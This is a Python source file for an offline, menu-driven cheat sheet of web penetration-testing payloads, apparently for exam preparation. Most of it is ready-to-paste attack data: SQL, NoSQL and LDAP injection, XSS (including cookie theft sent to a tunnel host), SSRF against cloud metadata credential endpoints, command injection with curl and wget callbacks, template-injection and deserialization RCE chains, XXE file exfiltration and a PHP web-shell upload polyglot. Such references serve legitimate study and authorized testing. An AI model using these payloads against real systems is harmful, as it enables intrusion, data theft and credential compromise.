#!/usr/bin/env python3
# Copyright (c) 2026 cyberprophetTV. Licensed under the MIT License (see LICENSE).
#
# FOR EDUCATIONAL USE ONLY. See README.
"""
=====================================================================
cheatsheet.py - Browsable offline reference of common web-pentest payloads
=====================================================================

What this is: a categorized, searchable reference card you can pull
up DURING an engagement when you can't remember the exact syntax for
an MSSQL time-based payload, or which template engine `{{7*7}}`
versus `${7*7}` belongs to, or the Apache UTF-8 overlong dot.

What it isn't: a live attack tool. It just shows you payloads + when
to use them. You copy-paste from the terminal into your real tool
(intruder.py, Repeater, sqlmap, whatever).

USAGE
-----
   python3 cheatsheet.py              # interactive menu
   python3 cheatsheet.py search sqli  # one-shot grep across all entries
   python3 cheatsheet.py list         # dump every entry to stdout
   python3 cheatsheet.py list xss     # dump one category

INTERACTIVE NAVIGATION
----------------------
   - Pick a category from the menu.
   - Pick an entry within it - get the payload + when-to-use + notes.
   - "search" command from any menu does a substring grep across
     all entries.
   - "list" command dumps everything (for piping to less / grep).

ADDING CATEGORIES / ENTRIES
---------------------------
Append to CHEATSHEET below. Each entry is a CheatEntry with title,
payload (or list of payloads), when, optional notes. Categories are
just CheatCategory objects bundling related entries.
"""

import argparse
import sys
from dataclasses import dataclass, field

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    from rich.theme import Theme
    import questionary
except ImportError as e:
    sys.stderr.write(
        "cheatsheet.py needs Rich and questionary:\n"
        "  pip install rich questionary\n"
        f"(missing module: {e.name})\n"
    )
    sys.exit(1)


# =====================================================================
# DATA STRUCTURES
# =====================================================================
@dataclass
class CheatEntry:
    title: str
    payload: str                # the payload itself, ready to paste
    when:  str                  # one-line "use when..." context
    notes: str = ""             # optional extra explanation


@dataclass
class CheatCategory:
    name: str
    blurb: str                  # one-line "what this category covers"
    entries: list[CheatEntry] = field(default_factory=list)


# =====================================================================
# CONTENT
# =====================================================================
# Curated from PortSwigger's own academy, OWASP, and the BSCP exam-
# preparation community. Heavy bias toward "what you'll actually
# need in an exam scenario" - not exhaustive (HackTricks is for that).

CHEATSHEET: list[CheatCategory] = [

    CheatCategory(
        name="SQL Injection",
        blurb="UNION-based, error-based, blind, time-based; bypass tips",
        entries=[
            CheatEntry(
                title="Basic auth bypass",
                payload="' OR '1'='1'--",
                when="Login form's username/password field. The `--` comments out the rest of the WHERE clause.",
                notes="Variants: `admin'--`, `' OR 1=1--`, `\" OR \"\"=\"`."
            ),
            CheatEntry(
                title="UNION SELECT - data extraction (column count probe)",
                payload="' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT NULL,NULL,NULL--",
                when="After confirming injectability, find the column count by adding NULLs until no error.",
                notes="Once column count is known, replace NULLs with strings to find which columns render: `' UNION SELECT 'a',NULL,NULL--`"
            ),
            CheatEntry(
                title="UNION SELECT - database schema discovery",
                payload="' UNION SELECT table_name,NULL FROM information_schema.tables--\n' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
                when="MySQL/MSSQL/PostgreSQL with UNION-based injection. Oracle uses ALL_TABLES.",
                notes="Oracle equivalent: `UNION SELECT table_name FROM all_tables--`."
            ),
            CheatEntry(
                title="Boolean-based blind (no error, no UNION output)",
                payload="' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--",
                when="Server doesn't reflect query results but RESPONDS DIFFERENTLY when condition is true vs false.",
                notes="Combine with `intruder.py` sniper-mode fuzz on the character to extract one char at a time."
            ),
            CheatEntry(
                title="Time-based blind - MySQL / MariaDB",
                payload="'; SELECT IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--",
                when="No content-based oracle - the response is identical for true vs false, but server takes longer when condition is true.",
                notes="Use `intruder.py --baseline-samples 5 --match-time-delta 4` to detect."
            ),
            CheatEntry(
                title="Time-based blind - PostgreSQL",
                payload="'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
                when="Same as MySQL pattern, different syntax.",
            ),
            CheatEntry(
                title="Time-based blind - MSSQL",
                payload="'; IF (1=1) WAITFOR DELAY '0:0:5'--",
                when="MSSQL doesn't have SLEEP; uses WAITFOR DELAY.",
            ),
            CheatEntry(
                title="Time-based blind - Oracle",
                payload="' || (CASE WHEN (1=1) THEN dbms_pipe.receive_message('a',5) ELSE NULL END)--",
                when="Oracle - the canonical timing oracle.",
            ),
            CheatEntry(
                title="Stacked queries (DROP / INSERT / UPDATE)",
                payload="'; DROP TABLE users--",
                when="When the backend uses something that allows multi-statement (MSSQL, some Postgres setups). MySQL via mysqli usually does NOT.",
                notes="Mostly defanged in modern apps; useful primarily for blind-detection (`'; WAITFOR DELAY '0:0:5'--`)."
            ),
            CheatEntry(
                title="Out-of-band data exfiltration via DNS",
                payload="'; SELECT load_file(CONCAT('\\\\\\\\',(SELECT password FROM users WHERE username='admin'),'.attacker-collab.example\\\\a'))--",
                when="Blind injection where the server can do DNS lookups. Combines with `--oob-host` on `intruder.py`.",
                notes="MSSQL variant: `xp_dirtree`. Oracle: `UTL_HTTP.REQUEST`."
            ),
            CheatEntry(
                title="WAF bypass - inline comments",
                payload="UNI/**/ON SEL/**/ECT NULL,NULL--",
                when="WAF blocks `UNION SELECT` as a string. MySQL allows `/**/` comments INSIDE keywords.",
                notes="Variants: `UNION%0aSELECT`, `UNION%20%2D%2DSELECT`."
            ),
        ],
    ),

    CheatCategory(
        name="XSS - Cross-Site Scripting",
        blurb="Reflection-context-aware payloads, polyglots, filter bypass",
        entries=[
            CheatEntry(
                title="Basic script tag (HTML body context)",
                payload="<script>alert(1)</script>",
                when="Input is reflected directly into HTML body (between tags). The simplest possible probe.",
            ),
            CheatEntry(
                title="HTML attribute context - break out + new attr",
                payload="\" autofocus onfocus=alert(1) x=\"",
                when="Reflection inside an HTML attribute value, e.g. `<input value=\"INPUT HERE\">`. The closing `\"` breaks the attribute; `autofocus onfocus` fires immediately.",
                notes="Variants for unquoted attrs: ` autofocus onfocus=alert(1)` (no break-out needed)."
            ),
            CheatEntry(
                title="JavaScript string context - break out",
                payload="';alert(1)//",
                when="Reflection inside a JS string literal, e.g. `<script>var x='INPUT HERE'</script>`. The `'` ends the literal; `//` comments out the rest.",
                notes="Variants by quote style: `\";alert(1)//`, `</script><script>alert(1)//`."
            ),
            CheatEntry(
                title="URL context - javascript:",
                payload="javascript:alert(1)",
                when="Reflection inside a URL attribute like `<a href=\"INPUT HERE\">`. The `javascript:` scheme triggers on click.",
            ),
            CheatEntry(
                title="Event handler payloads (XSS via image)",
                payload="<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>",
                when="`<script>` is filtered but other tags pass. `onerror` fires when the image fails to load.",
            ),
            CheatEntry(
                title="Polyglot (works in many contexts)",
                payload="jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
                when="When you don't know the context but want one payload that works in MANY. From OWASP's polyglot list.",
            ),
            CheatEntry(
                title="DOM XSS via location.hash",
                payload="https://target.com/page#<img src=x onerror=alert(1)>",
                when="Client-side JS reads `location.hash` and writes it into the DOM without escaping (`document.write`, `innerHTML`).",
            ),
            CheatEntry(
                title="Cookie theft / exfiltration to your server",
                payload="<script>new Image().src='https://YOUR-TUNNEL.trycloudflare.com/log?c='+document.cookie</script>",
                when="Stored XSS confirmed - now exfiltrate. Pair with `exploit_server.py serve ./payloads --tunnel cloudflared`.",
                notes="`HttpOnly` cookies are unreadable from JS. If session cookie is HttpOnly, target a different leakable thing (CSRF token, account data via XHR)."
            ),
            CheatEntry(
                title="HTML entity bypass (filter strips < and >)",
                payload="&lt;script&gt;alert(1)&lt;/script&gt;",
                when="Filter unescapes HTML entities AFTER its block check. Rare but seen.",
            ),
            CheatEntry(
                title="Filter bypass via tag mixing",
                payload="<scr<script>ipt>alert(1)</scr</script>ipt>",
                when="Filter removes `<script>` substring naively - after removal, the remaining outer tag is intact.",
            ),
        ],
    ),

    CheatCategory(
        name="SSRF - Server-Side Request Forgery",
        blurb="Cloud metadata, internal services, filter bypass tricks",
        entries=[
            CheatEntry(
                title="AWS instance metadata (EC2/ECS)",
                payload="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                when="Target is on AWS - the metadata service returns IAM creds without auth from within the VPC.",
                notes="IMDSv2 requires a token first: `PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds: 21600`."
            ),
            CheatEntry(
                title="GCP metadata",
                payload="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n(requires header `Metadata-Flavor: Google`)",
                when="Target is on Google Cloud. Returns OAuth tokens.",
            ),
            CheatEntry(
                title="Azure metadata",
                payload="http://169.254.169.254/metadata/instance?api-version=2021-02-01\n(requires header `Metadata: true`)",
                when="Target on Azure.",
            ),
            CheatEntry(
                title="Localhost via IPv6 (filter blocks 127.0.0.1)",
                payload="http://[::1]/\nhttp://[::ffff:127.0.0.1]/",
                when="Filter is a literal `127.0.0.1` blocklist - many parsers accept these IPv6 forms.",
            ),
            CheatEntry(
                title="Localhost via decimal / octal / hex",
                payload="http://2130706433/    (decimal 127.0.0.1)\nhttp://017700000001/  (octal)\nhttp://0x7f000001/   (hex)",
                when="Filter is a string-match blocklist on `127.0.0.1`. The OS resolves these to the same address.",
            ),
            CheatEntry(
                title="DNS rebinding",
                payload="http://attacker-rebind.example.com/ (a domain you control whose DNS alternates between your IP and 127.0.0.1)",
                when="Filter does DNS lookup at validation time, then re-resolves at request time. By the second resolve, your DNS points at the internal IP.",
                notes="Services that automate this: rbndr.us, https://lock.cmpxchg8b.com/rebinder.html."
            ),
            CheatEntry(
                title="Filter bypass via @ in URL",
                payload="http://allowed-host.com@evil.com/",
                when="Filter validates by prefix-matching `allowed-host.com`. The `@` makes `allowed-host.com` the USERNAME, not the host.",
            ),
            CheatEntry(
                title="Filter bypass via redirect",
                payload="http://your-server.com/redirect-to-localhost  (returns 302 -> http://127.0.0.1/)",
                when="Filter validates the initial URL but the application follows redirects without re-validating.",
            ),
            CheatEntry(
                title="Blind SSRF detection via OOB",
                payload="http://abc123.YOUR-OAST-HOST.interactsh-server.example/probe",
                when="The endpoint accepts a URL but doesn't reflect the response. Send a probe to your collaborator; any hit there proves SSRF.",
                notes="Pair with `intruder.py --oob-host abc123.YOUR-HOST` for auto-injection. See also workflow-cross-app-ssrf.json."
            ),
            CheatEntry(
                title="Gopher protocol for raw TCP",
                payload="gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$1%0d%0aA%0d%0a$1%0d%0a1%0d%0a",
                when="SSRF + filter allows gopher:// - lets you send arbitrary bytes to internal TCP services (Redis, memcached, SMTP).",
            ),
        ],
    ),

    CheatCategory(
        name="JWT Attacks",
        blurb="alg=none variants, kid injection, alg confusion, HS256 brute",
        entries=[
            CheatEntry(
                title="alg=none variants (use jwt_tool.py)",
                payload="python3 jwt_tool.py none '<TOKEN>' --set role=admin --set sub=admin",
                when="Test every variant - the script emits all 8 (5 casings + alg-removed + 2 stripped) automatically.",
                notes="Even if 'none' is filtered, 'None'/'NONE'/'nOnE' often slip through."
            ),
            CheatEntry(
                title="HS256 secret brute force (offline)",
                payload="python3 jwt_tool.py brute '<TOKEN>' --wordlist common-jwt-secrets.txt",
                when="alg=HS256 with a suspected weak secret. Common in tutorials/dev environments. Bundled wordlist has 80+ candidates.",
            ),
            CheatEntry(
                title="kid injection - path to empty file",
                payload="python3 jwt_tool.py kid '<TOKEN>'   # emits 8 variants",
                when="Header contains `kid` (Key ID). Server may use it to look up the verification key. `../../../dev/null` -> empty key -> HMAC with empty secret is predictable.",
            ),
            CheatEntry(
                title="Algorithm confusion - RS256 -> HS256",
                payload="Manual: take target's public RSA key, use as the HMAC secret to sign a forged token with alg=HS256.",
                when="Server expects RS256 (asymmetric) but the verifier passes the public key to a generic HMAC verifier. Naive implementations accept this.",
                notes="If you have the public key, sign with HS256 + that key. jwt_tool doesn't automate this (yet)."
            ),
            CheatEntry(
                title="Decode + inspect a token",
                payload="python3 jwt_tool.py decode '<TOKEN>'",
                when="ALWAYS the first step. Reveals alg, kid, role claims, expiration, etc.",
            ),
        ],
    ),

    CheatCategory(
        name="OS Command Injection",
        blurb="Separators, blind detection, encoding bypass",
        entries=[
            CheatEntry(
                title="Basic separators",
                payload="; id\n| id\n& id\n&& id\n|| id\n`id`\n$(id)",
                when="Server passes user input to shell. Try each in order - apps filter some but miss others.",
                notes="`$(id)` is sub-shell expansion; `\\`id\\`` is the older syntax."
            ),
            CheatEntry(
                title="Blind detection via time delay",
                payload="; sleep 5\n| ping -c 5 127.0.0.1\n`sleep 5`",
                when="Output isn't reflected - confirm via measurable delay. Use `intruder.py --match-time-delta 4`.",
            ),
            CheatEntry(
                title="Blind detection via DNS / HTTP OOB",
                payload="; curl http://abc.YOUR-OAST/probe\n; nslookup probe.YOUR-OAST.example.com\n`wget http://abc.YOUR-OAST/`",
                when="Output isn't reflected AND time-based is unreliable. Any hit on your OAST log proves RCE.",
            ),
            CheatEntry(
                title="Space bypass - $IFS",
                payload="cat$IFS/etc/passwd\nls$IFS-la\n{cat,/etc/passwd}",
                when="Filter blocks the space character. `$IFS` is the shell's internal field separator. `{a,b}` brace expansion has commas not spaces.",
            ),
            CheatEntry(
                title="Quoting bypass",
                payload="ca\"\"t /et\"\"c/passwd\nc'a't /et'c'/passwd",
                when="Filter blocks the literal string `cat` or `/etc/passwd`. The shell strips empty quotes before executing.",
            ),
        ],
    ),

    CheatCategory(
        name="Template Injection (SSTI)",
        blurb="Test payloads per template engine; engine detection",
        entries=[
            CheatEntry(
                title="Detection - try basic arithmetic in each syntax",
                payload="{{7*7}}\n${7*7}\n<%= 7*7 %>\n#{7*7}\n${{7*7}}\n@(7*7)\n%{7*7}\n[[7*7]]",
                when="ALWAYS try this first. The one that returns `49` tells you the template engine. Each maps to a different language.",
                notes="{{}} = Jinja2/Twig (Python/PHP). ${} = JSP/Thymeleaf/Velocity (Java). <%= %> = ERB (Ruby). #{} = Velocity/Ruby. @() = Razor (.NET). %{} = Struts (Java)."
            ),
            CheatEntry(
                title="Jinja2 (Python) - RCE",
                payload="{{ ''.__class__.__mro__[1].__subclasses__()[XXX]('id', shell=True, stdout=-1).communicate() }}",
                when="Jinja2 detected via `{{7*7}}` -> 49. Replace XXX with the index of subprocess.Popen (varies by Python version).",
                notes="Modern Jinja2 sandboxing makes this harder; try `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` first."
            ),
            CheatEntry(
                title="Twig (PHP) - RCE",
                payload="{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
                when="Twig detected. Slightly older Twig <2.x.",
            ),
            CheatEntry(
                title="Velocity (Java) - RCE",
                payload="#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"id\")",
                when="Velocity detected via `#{7*7}` -> 49.",
            ),
            CheatEntry(
                title="Freemarker (Java) - RCE",
                payload="<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
                when="Freemarker - found in many Spring-based stacks.",
            ),
        ],
    ),

    CheatCategory(
        name="File Upload",
        blurb="Extension tricks, MIME tricks, polyglots",
        entries=[
            CheatEntry(
                title="Double extension",
                payload="shell.php.jpg\nshell.jpg.php",
                when="Filter checks the LAST extension OR the FIRST extension. Try both - one of them often slips through.",
            ),
            CheatEntry(
                title="Null-byte truncation",
                payload="shell.php%00.jpg\nshell.php\\x00.jpg",
                when="Older PHP/Java - the null byte truncates the filename at the server side but the validator sees the full string.",
            ),
            CheatEntry(
                title="Case manipulation",
                payload="shell.pHp\nshell.PHP\nshell.Php5",
                when="Filter is case-sensitive blocklist of `.php` but the server's file dispatcher is case-insensitive.",
            ),
            CheatEntry(
                title="Alternative PHP extensions",
                payload="shell.phtml\nshell.php3\nshell.php4\nshell.php5\nshell.phps\nshell.pht\nshell.phar",
                when="`.php` is blocked but server still executes these as PHP.",
            ),
            CheatEntry(
                title="Content-Type spoofing",
                payload="(in Burp: change `Content-Type: application/x-php` to `Content-Type: image/jpeg`)",
                when="Filter trusts the multipart MIME type instead of file content / extension.",
            ),
            CheatEntry(
                title="Magic byte spoofing (polyglot)",
                payload="GIF89a;<?php system($_GET['c']); ?>",
                when="Filter checks magic bytes to ensure 'really an image'. Prepend a valid image signature to PHP code; many parsers see GIF and accept it.",
            ),
            CheatEntry(
                title="Path traversal in filename",
                payload="../../../var/www/html/shell.php",
                when="Server saves uploads under a path constructed from the filename without sanitization. Combined with .php extension = RCE.",
            ),
        ],
    ),

    CheatCategory(
        name="XXE - XML External Entity",
        blurb="Basic read, blind via OOB, parameter entities",
        entries=[
            CheatEntry(
                title="Basic file read (in-band)",
                payload="<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                when="App accepts user-supplied XML AND echoes the parsed content back. Replace `foo` with whatever the app's expected root element is.",
            ),
            CheatEntry(
                title="Blind XXE via OOB DNS/HTTP",
                payload="<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://abc.YOUR-OAST/probe\">]><foo>&xxe;</foo>",
                when="XML is parsed but content isn't reflected. OAST hit confirms.",
            ),
            CheatEntry(
                title="Parameter entities (blind file exfil)",
                payload="<!DOCTYPE foo [<!ENTITY % d SYSTEM \"http://YOUR-SERVER/x.dtd\">%d;]>\n# x.dtd:\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % all \"<!ENTITY exfil SYSTEM 'http://YOUR-SERVER/?d=%file;'>\">\n%all;",
                when="Blind XXE where you can't get the file content in the OOB probe directly. Two-stage: load external DTD that exfils the file.",
            ),
            CheatEntry(
                title="SSRF via XXE",
                payload="<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]><foo>&xxe;</foo>",
                when="XXE that returns content - use as an SSRF primitive to hit AWS metadata etc.",
            ),
        ],
    ),

    CheatCategory(
        name="CSRF",
        blurb="Token-check bypass, referer bypass, GET version of POST",
        entries=[
            CheatEntry(
                title="Token absent vs invalid",
                payload="(remove the CSRF token parameter entirely)",
                when="Some apps only validate the token WHEN PRESENT. Removing the parameter skips validation.",
            ),
            CheatEntry(
                title="Token-method mismatch (use GET for POST)",
                payload="(change `POST /change-email` to `GET /change-email?email=attacker@evil`)",
                when="App's CSRF middleware only checks state-changing methods (POST/PUT). GET requests for the same action bypass.",
            ),
            CheatEntry(
                title="Token tied to user but not to action",
                payload="(use your own valid token, but submit the action against another user)",
                when="Token is randomized per session but the server doesn't bind it to a specific action - reusable across endpoints.",
            ),
            CheatEntry(
                title="SameSite=Lax bypass via GET-mutator",
                payload="(host a page with: <iframe src=\"https://target/admin/delete-user?id=X\"></iframe>)",
                when="Cookie is SameSite=Lax (default in modern browsers). Lax SENDS the cookie on GET top-level navigation, just not on POST.",
            ),
            CheatEntry(
                title="JSON-content-type bypass (avoid preflight)",
                payload="(set Content-Type: text/plain on your PoC's fetch() - skip CORS preflight, send the JSON body as a string)",
                when="App accepts JSON but the CSRF protection assumes only application/json triggers preflight.",
            ),
        ],
    ),

    CheatCategory(
        name="NoSQL Injection (MongoDB-flavored)",
        blurb="Auth bypass via $ne / $regex; blind via $where",
        entries=[
            CheatEntry(
                title="Auth bypass via $ne (NOT EQUAL)",
                payload="username[$ne]=&password[$ne]=",
                when="Login endpoint expects `username=...&password=...`. PHP/Node parsers convert `[$ne]` into the BSON operator `{$ne: ''}`. Returns true for any user.",
            ),
            CheatEntry(
                title="Auth bypass via $gt (GREATER THAN)",
                payload="username[$gt]=&password[$gt]=",
                when="Same idea as $ne. Tries every user/pass where the value is greater than empty string (= all of them).",
            ),
            CheatEntry(
                title="Boolean-blind extraction via $regex",
                payload="username=admin&password[$regex]=^a",
                when="Confirm if password starts with 'a' - true response = yes, false = no. Loop through characters.",
            ),
            CheatEntry(
                title="Time-based via $where (JavaScript injection)",
                payload="username=admin&password[$where]=sleep(5000)||true",
                when="MongoDB pre-3.6 accepts JS in $where. Detect via response time.",
            ),
            CheatEntry(
                title="JSON body equivalents",
                payload='{"username": {"$ne": null}, "password": {"$ne": null}}',
                when="API accepts JSON body. Same operators, different transport.",
            ),
        ],
    ),

    CheatCategory(
        name="LDAP Injection",
        blurb="Filter bypass + blind boolean extraction",
        entries=[
            CheatEntry(
                title="Auth bypass via wildcard",
                payload="*)(uid=*\n*))(|(uid=*",
                when="LDAP auth where filter is `(uid=USER)(password=PASS)`. The `*` matches everything.",
            ),
            CheatEntry(
                title="Always-true via OR",
                payload="admin)(|(cn=*",
                when="Bypass the password check by making the AND become an OR.",
            ),
            CheatEntry(
                title="Blind extraction (character-by-character)",
                payload="admin)(userPassword=a*",
                when="Test if password starts with 'a'. Server returns success or fail based on the test - loop one char at a time.",
            ),
        ],
    ),

    CheatCategory(
        name="Race Condition",
        blurb="Single-packet attacks, multi-thread submission",
        entries=[
            CheatEntry(
                title="Burp Pro single-packet attack",
                payload="(In Repeater: send N parallel requests as a single TCP packet. Pro feature added 2023.)",
                when="App's check + commit are separated by milliseconds. Submit N requests simultaneously, all pass the check, all commit.",
                notes="Common targets: redeem-coupon endpoints, transfer-money, register-username uniqueness checks."
            ),
            CheatEntry(
                title="Multi-thread with raw HTTP (free alternative)",
                payload="(use `intruder.py` with --workers 50 against the vulnerable endpoint)",
                when="Don't have Burp Pro. Fire 50 concurrent identical requests and look for unexpected success counts (e.g. 2 successful redemptions of a single-use coupon).",
            ),
            CheatEntry(
                title="Sleep-based race confirmation",
                payload="(inject `?delay=5` if the endpoint supports it - some apps log timing)",
                when="Suspecting a race but can't directly confirm. Look for parallel requests overlapping in logs.",
            ),
        ],
    ),

    CheatCategory(
        name="Path Traversal",
        blurb="Encoding variants (see path-traversal-payloads.txt for full list)",
        entries=[
            CheatEntry(
                title="Basic + ready-to-use",
                payload="../../../etc/passwd\n../../../etc/hosts\n../../../proc/self/environ\n/etc/passwd",
                when="Try first - many apps have NO protection at all.",
            ),
            CheatEntry(
                title="URL-encoded slash",
                payload="..%2f..%2f..%2fetc%2fpasswd\n%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                when="Filter checks for `../` as a literal string. URL-encoding bypasses string-match.",
            ),
            CheatEntry(
                title="Double URL-encoded",
                payload="..%252f..%252f..%252fetc%252fpasswd",
                when="Filter decodes ONCE then checks - the second decode at the application level reveals `../`.",
            ),
            CheatEntry(
                title="Java framework normalization bypass",
                payload="....//....//....//etc/passwd",
                when="Java normalizers collapse `../` but leave `....//`. Tomcat / certain Spring versions.",
            ),
            CheatEntry(
                title="See bundled wordlist",
                payload="python3 intruder.py req.txt --payload path-traversal-payloads.txt --mode sniper --match-status 200",
                when="80+ variants across encoding, depth, OS - fire all at once.",
            ),
        ],
    ),

    CheatCategory(
        name="Open Redirect",
        blurb="Common URL params + bypass tricks for the validator",
        entries=[
            CheatEntry(
                title="Common parameter names",
                payload="?next=https://evil.com\n?redirect=https://evil.com\n?url=https://evil.com\n?return=https://evil.com\n?goto=https://evil.com\n?continue=https://evil.com",
                when="The classic params - test each on every page that performs a redirect (login, logout, payment success, etc.).",
            ),
            CheatEntry(
                title="Validator bypass - @ in URL",
                payload="?next=http://allowed-host.com@evil.com/",
                when="Validator allowlists `allowed-host.com` via prefix-match. The `@` makes it the username portion.",
            ),
            CheatEntry(
                title="Validator bypass - protocol-relative URL",
                payload="?next=//evil.com\n?next=\\\\evil.com",
                when="Validator only checks if input starts with the app's hostname; `//evil.com` is interpreted as `https://evil.com` by browsers.",
            ),
            CheatEntry(
                title="Subdomain confusion",
                payload="?next=https://target.com.evil.com/\n?next=https://evil.com/?target.com",
                when="Validator uses substring match on target's domain - the substring appears but the host is different.",
            ),
            CheatEntry(
                title="Chain with OAuth for token theft",
                payload="?redirect_uri=https://evil.com/grab-token",
                when="OAuth flows often have weak redirect_uri validation. Bypass → victim's OAuth token sent to your server.",
            ),
        ],
    ),

    CheatCategory(
        name="Web Cache Poisoning",
        blurb="Unkeyed headers (see unkeyed-headers.txt for full list)",
        entries=[
            CheatEntry(
                title="X-Forwarded-Host - the classic",
                payload="X-Forwarded-Host: evil.com",
                when="App builds absolute URLs (in <link rel=canonical>, JS asset paths, etc.) from X-Forwarded-Host without validation. Cached response serves YOUR host to everyone.",
            ),
            CheatEntry(
                title="X-Forwarded-Scheme",
                payload="X-Forwarded-Scheme: nothttps",
                when="App generates redirect URLs based on the scheme - if scheme isn't `https`, it might redirect to `http://target.com/...` which the cache stores.",
            ),
            CheatEntry(
                title="X-Original-URL / X-Rewrite-URL",
                payload="X-Original-URL: /admin",
                when="App's routing layer trusts these headers and serves `/admin` content while the cache key remains `/`. Cached at `/`.",
            ),
            CheatEntry(
                title="See bundled wordlist + template",
                payload="python3 intruder.py examples/cache-poison-template.txt --payload unkeyed-headers.txt --mode sniper --match-length '!<baseline>'",
                when="Comprehensive fuzz across 40+ candidate headers.",
            ),
        ],
    ),

    CheatCategory(
        name="Deserialization (Java + PHP)",
        blurb="Use ysoserial / phpggc (installed by bscp-setup.sh)",
        entries=[
            CheatEntry(
                title="Java URLDNS (detection probe)",
                payload="ysoserial URLDNS https://abc.YOUR-OAST/probe | base64 -w0",
                when="FIRST step. Just causes a DNS lookup - safe for confirming the sink exists before chaining to RCE.",
            ),
            CheatEntry(
                title="Java CommonsCollections6 (RCE)",
                payload="ysoserial CommonsCollections6 'curl https://abc.YOUR-OAST/x' | base64 -w0",
                when="URLDNS confirmed + target has commons-collections on classpath (very common in older Java apps).",
            ),
            CheatEntry(
                title="Other Java chains to try if CC6 fails",
                payload="ysoserial CommonsCollections1 'id'\nysoserial CommonsBeanutils1 'id'\nysoserial Hibernate1 'id'\nysoserial Spring1 'id'",
                when="Different stacks - one of them usually lands.",
            ),
            CheatEntry(
                title="PHP - list available chains",
                payload="phpggc -l",
                when="Discover which framework/version chains are available. Use grep to filter.",
            ),
            CheatEntry(
                title="PHP Laravel RCE",
                payload="phpggc Laravel/RCE5 system 'curl https://abc.YOUR-OAST/x' -b",
                when="Target is Laravel. `-b` base64-encodes the output.",
            ),
        ],
    ),
]


# =====================================================================
# SEARCH
# =====================================================================
def search_all(query: str) -> list[tuple[CheatCategory, CheatEntry]]:
    """Return every (category, entry) where query appears anywhere."""
    q = query.lower()
    out = []
    for cat in CHEATSHEET:
        for entry in cat.entries:
            blob = " ".join([
                entry.title, entry.payload, entry.when, entry.notes,
                cat.name, cat.blurb,
            ]).lower()
            if q in blob:
                out.append((cat, entry))
    return out


# =====================================================================
# RENDERING
# =====================================================================
THEME = Theme({
    "primary":  "bold cyan",
    "accent":   "bold magenta",
    "success":  "bold green",
    "warning":  "bold yellow",
    "error":    "bold red",
    "muted":    "dim white",
    "payload":  "bold green",
    "category": "bold cyan",
})


def render_entry(console: Console, cat: CheatCategory, entry: CheatEntry) -> None:
    """Print one entry as a panel with title + payload + when + notes."""
    body = Text()
    body.append("Payload:\n", style="primary")
    body.append(entry.payload + "\n\n", style="payload")
    body.append("When:\n", style="primary")
    body.append(entry.when + "\n", style="muted")
    if entry.notes:
        body.append("\nNotes:\n", style="primary")
        body.append(entry.notes, style="muted")
    console.print(Panel(
        body,
        title=f"[category]{cat.name}[/category]  ›  [accent]{entry.title}[/accent]",
        border_style="primary",
        padding=(1, 2),
    ))


def render_category_list(console: Console) -> None:
    """Top-level menu rendering - shows every category with entry count."""
    table = Table(title="Categories", title_style="primary",
                   border_style="muted", show_lines=False)
    table.add_column("#", style="accent", width=3)
    table.add_column("Category", style="primary")
    table.add_column("Entries", style="success", justify="right")
    table.add_column("About", style="muted")
    for i, cat in enumerate(CHEATSHEET, start=1):
        table.add_row(str(i), cat.name, str(len(cat.entries)), cat.blurb)
    console.print(table)


# =====================================================================
# TUI
# =====================================================================
def make_qstyle():
    return questionary.Style([
        ("qmark",     "fg:#00ffff bold"),
        ("question",  "fg:#ffffff bold"),
        ("answer",    "fg:#ff00ff bold"),
        ("pointer",   "fg:#00ffff bold"),
        ("highlighted", "fg:#00ffff bold"),
    ])


def show_banner(console: Console):
    body = Text.assemble(
        ("cheatsheet.py", "primary"),
        ("  —  ", "muted"),
        ("offline web-pentest payload reference\n\n", "accent"),
        (f"  {len(CHEATSHEET)} categories  |  ", "muted"),
        (f"{sum(len(c.entries) for c in CHEATSHEET)} entries\n\n", "muted"),
        ("Pick a category to browse, or type a search term ", "muted"),
        ("(e.g. 'time-based')", "accent"),
        (". `quit` to exit.", "muted"),
    )
    console.print(Panel(body, border_style="primary", padding=(1, 2)))


def tui_loop():
    console = Console(theme=THEME, highlight=False)
    q_style = make_qstyle()
    show_banner(console)

    while True:
        render_category_list(console)
        choices = ([f"{i}. {c.name}" for i, c in enumerate(CHEATSHEET, start=1)]
                    + ["Search...", "Quit"])
        pick = questionary.select(
            "Select category or action:",
            choices=choices, qmark="", style=q_style,
        ).ask()
        if pick is None or pick == "Quit":
            console.print("[muted]bye[/muted]")
            return
        if pick == "Search...":
            query = questionary.text(
                "Search across every entry  (example: 'time-based' / 'jwt' / 'aws metadata')",
                qmark="", style=q_style,
            ).ask()
            if not query:
                continue
            matches = search_all(query)
            if not matches:
                console.print(f"[warning]No matches for {query!r}[/warning]")
                continue
            console.print(f"[primary]{len(matches)} match(es) for {query!r}:[/primary]")
            for i, (cat, entry) in enumerate(matches, start=1):
                console.print(f"  [accent]{i:>3}.[/accent] [category]{cat.name}[/category] › {entry.title}")
